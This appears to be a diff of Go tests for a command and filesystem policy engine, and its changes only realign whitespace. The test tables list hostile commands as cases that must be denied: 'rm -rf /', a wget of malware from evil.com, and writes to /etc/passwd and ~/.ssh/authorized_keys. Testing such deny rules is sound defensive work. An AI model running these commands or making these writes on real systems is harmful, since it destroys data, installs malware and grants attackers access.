@@ -106,7 +106,7 @@ func TestEngineCheck_AllowRule(t *testing.T) {
 		{"ls -la", Allow},
 		{"cat /tmp/file.txt", Allow},
 		{"python script.py", Allow},
-		{"rm -rf /", Deny},          // default deny — no matching allow
+		{"rm -rf /", Deny},              // default deny — no matching allow
 		{"wget evil.com/malware", Deny}, // default deny
 	}
 
@@ -181,7 +181,7 @@ func TestEngineCheck_FilesystemScope(t *testing.T) {
 		{"write", "./workspace/output.txt", Allow},
 		{"write", "/etc/passwd", Deny},
 		{"write", "~/.ssh/authorized_keys", Deny},
-		{"read", "/var/log/syslog", Deny}, // default deny — no matching allow
+		{"read", "/var/log/syslog", Deny},        // default deny — no matching allow
 		{"delete", "./workspace/file.txt", Deny}, // no delete rules → default deny
 	}
 
@@ -363,9 +363,9 @@ func TestPolicyRuleCount(t *testing.T) {
 		Name:    "test",
 		Rules: []RuleSet{
 			{
-				Scope: "shell",
-				Allow: []Rule{{Pattern: "a"}, {Pattern: "b"}},
-				Deny:  []Rule{{Pattern: "c"}},
+				Scope:           "shell",
+				Allow:           []Rule{{Pattern: "a"}, {Pattern: "b"}},
+				Deny:            []Rule{{Pattern: "c"}},
 				RequireApproval: []Rule{{Pattern: "d"}},
 			},
 			{
